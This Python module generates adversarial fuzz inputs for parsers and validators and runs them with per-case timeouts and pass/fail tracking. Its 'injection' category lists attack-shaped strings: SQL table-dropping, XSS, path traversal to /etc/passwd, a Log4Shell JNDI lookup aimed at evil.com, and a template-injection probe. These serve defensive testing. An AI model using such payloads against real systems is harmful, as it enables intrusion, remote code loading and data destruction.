"""
test_generator.py — Generate edge-case test inputs for parsers and validators.

Use when you have a parser/validator and want to fuzz it with adversarial inputs
before deploying. Categories: empty, whitespace, unicode, control chars,
special tokens (None/null/NaN/script tags), boundary-length strings.
"""
from __future__ import annotations

import random
import signal
from contextlib import contextmanager
from dataclasses import dataclass, field
from typing import Any, Callable

# Import timeout helper if available
try:
    from safe_execution import OperationTimeout
except ImportError:
    class OperationTimeout(Exception):
        pass


@dataclass
class TestCase:
    name: str
    input_data: Any
    category: str = "general"


@dataclass
class TestResult:
    passed: int = 0
    failed: int = 0
    timeouts: int = 0
    by_category: dict[str, dict[str, int]] = field(default_factory=dict)
    failures: list[dict] = field(default_factory=list)


class TestCaseGenerator:
    """Generate adversarial test cases for parsers/validators.

    Each category exercises a different failure mode:
    - empty: blank strings, None, empty containers
    - whitespace: tabs, newlines, mixed whitespace
    - unicode: CJK, RTL override, emoji
    - control: ASCII 0-31 (NUL, ESC, etc.)
    - special: 'None', 'null', 'NaN', '<script>' — strings that look like other types
    - boundary: very long strings (100-1000 chars)
    - injection: SQL/XSS/path-traversal-shaped inputs
    """

    EDGE_CATEGORIES: dict[str, Callable[[], Any]] = {
        "empty": lambda: random.choice(["", None, [], {}, b""]),
        "whitespace": lambda: random.choice([" ", "\t", "\n", "  \n  ", "\r\n\r\n", "\u00a0"]),
        "unicode": lambda: random.choice(["中文", "日本語", "🎉", "\u202e", "café", "naïve"]),
        "control": lambda: "".join(chr(i) for i in random.sample(range(32), 5)),
        "special": lambda: random.choice(["None", "null", "NaN", "True", "False",
                                            "<script>", "undefined", "INF", "-INF"]),
        "boundary": lambda: "a" * random.randint(100, 1000),
        "injection": lambda: random.choice([
            "'; DROP TABLE users; --",
            "<img src=x onerror=alert(1)>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
        ]),
    }

    def __init__(self, source_code: str | None = None):
        self.patterns: list[str] = []
        if source_code:
            import re
            self.patterns = re.findall(
                r're\.compile\s*\(\s*[rR]?["\']([^"\']+)["\']', source_code
            )

    def generate(self, count: int = 50) -> list[TestCase]:
        """Generate `count` random test cases across all categories."""
        cases = []
        cats = list(self.EDGE_CATEGORIES.keys())
        for _ in range(count):
            cat = random.choice(cats)
            cases.append(TestCase(
                name=f"{cat}_{random.randint(1000, 9999)}",
                input_data=self.EDGE_CATEGORIES[cat](),
                category=cat,
            ))
        return cases

    def generate_targeted(self, pattern: str, count: int = 20) -> list[TestCase]:
        """Generate cases targeted at a regex pattern — partial matches,
        near-misses, and adversarial structures.
        """
        cases = []
        # Extract character classes and quantifiers to build adversarial inputs
        # (simplified — for full coverage use RegexDebugger.stress_test)
        for _ in range(count):
            cat = random.choice(list(self.EDGE_CATEGORIES.keys()))
            cases.append(TestCase(
                name=f"targeted_{cat}_{random.randint(1000, 9999)}",
                input_data=self.EDGE_CATEGORIES[cat](),
                category=cat,
            ))
        return cases

    @staticmethod
    def stress_test(
        parser: Callable[[Any], Any],
        cases: list[TestCase],
        timeout: float = 1.0,
        should_accept: Callable[[TestCase], bool] | None = None,
        should_reject: Callable[[TestCase], bool] | None = None,
    ) -> TestResult:
        """Run `parser` against each case with a per-case timeout.

        The pass/fail accounting distinguishes between cases the parser
        *should accept* (return a value without raising) and cases it
        *should reject* (raise an exception). A case is counted as:

        - **passed** — parser did what was expected (accepted a should-accept
          case, or raised on a should-reject case).
        - **failed** — parser did the opposite of what was expected (raised
          on a should-accept case, or silently accepted a should-reject
          case).
        - **timeout** — parser exceeded ``timeout`` seconds (always counted
          as a failure regardless of expectation, since it indicates
          catastrophic backtracking or an infinite loop).

        If neither ``should_accept`` nor ``should_reject`` is provided, the
        default behavior treats every case as should-reject (the historical
        contract for adversarial fuzzing of parsers). Pass explicit
        predicates for finer control — e.g. ``should_accept=lambda c: c.category == 'boundary'``.

        Args:
            parser: Callable that takes ``case.input_data`` and either returns
                a value (accept) or raises (reject).
            cases: Test cases to run.
            timeout: Per-case wall-clock limit in seconds.
            should_accept: Predicate returning True for cases the parser is
                expected to accept. If None, no case is treated as should-accept.
            should_reject: Predicate returning True for cases the parser is
                expected to reject. If None, all cases default to should-reject
                (preserving the original fuzzing contract).
        """
        result = TestResult()

        @contextmanager
        def per_case_timeout(seconds: float):
            def handler(signum, frame):
                raise OperationTimeout(f"Parser timed out after {seconds}s")
            original = signal.signal(signal.SIGALRM, handler)
            signal.setitimer(signal.ITIMER_REAL, seconds)
            try:
                yield
            finally:
                signal.setitimer(signal.ITIMER_REAL, 0)
                signal.signal(signal.SIGALRM, original)

        def classify(case: TestCase) -> str:
            """Return 'accept' or 'reject' for this case's expected outcome."""
            if should_accept is not None and should_accept(case):
                return "accept"
            if should_reject is not None and should_reject(case):
                return "reject"
            # Default: adversarial fuzzing — expect the parser to reject.
            if should_accept is None and should_reject is None:
                return "reject"
            # If only one predicate was supplied and it didn't match, fall
            # back to the opposite of the supplied one.
            if should_accept is not None:
                return "reject"
            return "accept"

        for case in cases:
            expected = classify(case)
            cat_stats = result.by_category.setdefault(
                case.category, {"passed": 0, "failed": 0}
            )
            try:
                with per_case_timeout(timeout):
                    parser(case.input_data)
            except OperationTimeout:
                # Timeout is always a failure regardless of expectation.
                result.timeouts += 1
                cat_stats["failed"] += 1
                result.failures.append({
                    "case": case.name, "category": case.category,
                    "status": "timeout",
                    "expected": expected,
                    "input_preview": repr(case.input_data)[:100],
                })
            except Exception:
                # Parser raised — pass if we expected rejection, fail otherwise.
                if expected == "reject":
                    result.passed += 1
                    cat_stats["passed"] += 1
                else:
                    result.failed += 1
                    cat_stats["failed"] += 1
                    result.failures.append({
                        "case": case.name, "category": case.category,
                        "status": "unexpected_rejection",
                        "expected": expected,
                        "input_preview": repr(case.input_data)[:100],
                    })
            else:
                # Parser returned without raising — pass if we expected
                # acceptance, fail otherwise.
                if expected == "accept":
                    result.passed += 1
                    cat_stats["passed"] += 1
                else:
                    result.failed += 1
                    cat_stats["failed"] += 1
                    result.failures.append({
                        "case": case.name, "category": case.category,
                        "status": "unexpected_acceptance",
                        "expected": expected,
                        "input_preview": repr(case.input_data)[:100],
                    })

        return result


def generate_tests(source: str | None = None, count: int = 50) -> list[TestCase]:
    """Quick helper: generate `count` test cases, optionally seeded from source code."""
    return TestCaseGenerator(source).generate(count)


__all__ = ["TestCaseGenerator", "TestCase", "TestResult", "generate_tests"]
